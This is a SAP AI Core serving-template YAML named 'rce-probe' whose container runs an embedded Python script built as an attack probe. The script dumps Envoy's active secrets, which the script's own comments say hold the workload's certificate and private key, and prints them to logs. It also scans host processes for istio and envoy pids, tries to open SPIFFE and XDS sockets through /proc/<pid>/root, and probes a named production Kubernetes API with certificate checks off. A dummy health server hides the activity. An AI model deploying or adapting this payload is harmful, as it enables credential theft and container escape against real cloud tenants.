apiVersion: ai.sap.com/v1alpha1
kind: ServingTemplate
metadata:
  name: rce-probe
  labels:
    scenarios.ai.sap.com/id: "rce-probe"
    ai.sap.com/version: "4.10.0"
  annotations:
    scenarios.ai.sap.com/name: "rce-probe"
    executables.ai.sap.com/description: "svid-privkey-pid-ns-xds-socket-probe"
    executables.ai.sap.com/name: "rce-probe"
spec:
  template:
    apiVersion: "serving.kserve.io/v1beta1"
    metadata:
      annotations: |
        autoscaling.knative.dev/target: 1
      labels: |
        ai.sap.com/resourcePlan: starter
    spec: |
      predictor:
        minReplicas: 1
        maxReplicas: 1
        containers:
        - name: kserve-container
          image: python:3.11
          command: ["/bin/sh", "-c"]
          args:
          - |
            python3 -c "
            import os, socket, struct, subprocess, glob, re

            print('[PROBE_V410_START]', flush=True)

            def emit(label, data):
                flat = str(data).replace('\r\n','|').replace('\r','|').replace('\n','|')
                # Strip potential private key material truncation by chunking
                for i in range(0, max(1, len(flat)), 3000):
                    chunk = flat[i:i+3000]
                    print(f'[{label}_{i}] {chunk}', flush=True)

            def envoy_admin(path, timeout=25):
                s = socket.socket(); s.settimeout(timeout)
                s.connect(('127.0.0.1', 15000))
                req = (
                    f'GET {path} HTTP/1.1\r\n'
                    'Host: 127.0.0.1\r\n'
                    'Connection: Upgrade, HTTP2-Settings\r\n'
                    'Upgrade: h2c\r\n'
                    'HTTP2-Settings: AAMAAABkAAQAAP__\r\n'
                    'Connection: close\r\n\r\n'
                )
                s.sendall(req.encode())
                chunks = []
                while True:
                    c = s.recv(65536)
                    if not c: break
                    chunks.append(c)
                s.close()
                return b''.join(chunks).decode(errors='replace')

            # ── 1. Full Envoy dynamic_active_secrets ────────────────────────────
            # This is the SVID cert+key if Envoy doesn't redact
            print('[SECRETS_DUMP_START]', flush=True)
            try:
                sec = envoy_admin('/config_dump?resource=dynamic_active_secrets', timeout=25)
                emit('SECRETS_FULL', sec)
            except Exception as e:
                emit('SECRETS_FULL_ERR', str(e))

            # ── 2. /proc/self/status (caps, uid, gid) ───────────────────────────
            try:
                with open('/proc/self/status') as f:
                    emit('SELF_STATUS', f.read())
            except Exception as e:
                emit('SELF_STATUS_ERR', str(e))

            # ── 3. Check if PID namespace shared — list /proc/*/cmdline ─────────
            print('[PID_SCAN_START]', flush=True)
            pids_found = []
            try:
                for pid_dir in sorted(os.listdir('/proc')):
                    if not pid_dir.isdigit(): continue
                    try:
                        with open(f'/proc/{pid_dir}/cmdline', 'rb') as f:
                            cmd = f.read().replace(b'\x00', b' ').decode(errors='replace').strip()
                        pids_found.append(f'{pid_dir}:{cmd[:80]}')
                    except:
                        pass
                emit('ALL_PIDS', pids_found)
            except Exception as e:
                emit('PID_SCAN_ERR', str(e))

            # ── 4. Try to access istio-proxy root via /proc/<pid>/root ──────────
            # Find pids of pilot-agent or envoy
            istio_pids = []
            for entry in pids_found:
                pid_str, cmd = entry.split(':', 1)
                if any(k in cmd for k in ['pilot-agent', 'envoy', 'istio', 'proxy']):
                    istio_pids.append((pid_str, cmd))
            emit('ISTIO_PIDS', istio_pids)

            for pid, cmd in istio_pids[:3]:
                for uds_path in [
                    '/etc/istio/proxy/XDS',
                    '/var/run/secrets/workload-spiffe-uds/socket',
                ]:
                    proc_path = f'/proc/{pid}/root{uds_path}'
                    exists = os.path.exists(proc_path)
                    emit(f'PROC_{pid}_ROOT_{uds_path.replace(\"/\",\"_\")}', exists)
                    if exists:
                        try:
                            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                            s.settimeout(5)
                            s.connect(proc_path)
                            # Send a SPIFFE workload API request (gRPC)
                            # FetchX509SVIDs request
                            s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
                            resp = s.recv(4096)
                            s.close()
                            emit(f'UDS_CONN_{pid}_{uds_path.replace(\"/\",\"_\")}', resp[:500].hex())
                        except Exception as e:
                            emit(f'UDS_ERR_{pid}_{uds_path.replace(\"/\",\"_\")}', str(e))

            # ── 5. Full /proc/mounts ─────────────────────────────────────────────
            try:
                with open('/proc/mounts') as f:
                    emit('PROC_MOUNTS_FULL', f.read())
            except Exception as e:
                emit('PROC_MOUNTS_ERR', str(e))

            # ── 6. Try connecting to XDS socket directly (abstract) ──────────────
            # Try both path forms in case the socket is accessible
            for sock_path in [
                '/etc/istio/proxy/XDS',
                '/var/run/secrets/workload-spiffe-uds/socket',
                '\x00etc/istio/proxy/XDS',
            ]:
                try:
                    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect(sock_path)
                    resp = s.recv(1024)
                    s.close()
                    emit(f'DIRECT_UDS_{sock_path[:30].replace(\"/\",\"_\")}', resp[:200].hex())
                except Exception as e:
                    emit(f'DIRECT_UDS_ERR_{sock_path[:30].replace(\"/\",\"_\")}', str(e)[:80])

            # ── 7. Check /proc/self/net/unix vs /proc/net/unix to confirm ───────
            try:
                with open('/proc/self/net/unix') as f:
                    emit('SELF_NET_UNIX', f.read())
            except Exception as e:
                emit('SELF_NET_UNIX_ERR', str(e))

            # ── 8. K8s API server reachability + anonymous endpoints ────────────
            k8s_host = os.environ.get('KUBERNETES_SERVICE_HOST', 'api.sec-eu10.mlfprod.internal.live.k8s.ondemand.com')
            k8s_port = int(os.environ.get('KUBERNETES_SERVICE_PORT', '443'))
            import ssl
            for path in ['/version', '/api/v1/namespaces', '/openid/v1/jwks', '/.well-known/openid-configuration']:
                try:
                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    s = socket.socket()
                    s.settimeout(8)
                    ss = ctx.wrap_socket(s, server_hostname=k8s_host)
                    ss.connect((k8s_host, k8s_port))
                    req = f'GET {path} HTTP/1.0\r\nHost: {k8s_host}\r\n\r\n'
                    ss.sendall(req.encode())
                    resp = b''
                    while True:
                        c = ss.recv(65536)
                        if not c: break
                        resp += c
                    ss.close()
                    emit(f'K8S_API_{path.replace(\"/\",\"_\")}', resp[:800].decode(errors='replace'))
                except Exception as e:
                    emit(f'K8S_API_ERR_{path.replace(\"/\",\"_\")}', str(e))

            print('[PROBE_V410_DONE]', flush=True)
            " 2>&1
            python3 -c "
            import http.server
            class H(http.server.BaseHTTPRequestHandler):
                def do_GET(self): self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
                def log_message(self, *a): pass
            http.server.HTTPServer(('', 8080), H).serve_forever()
            "
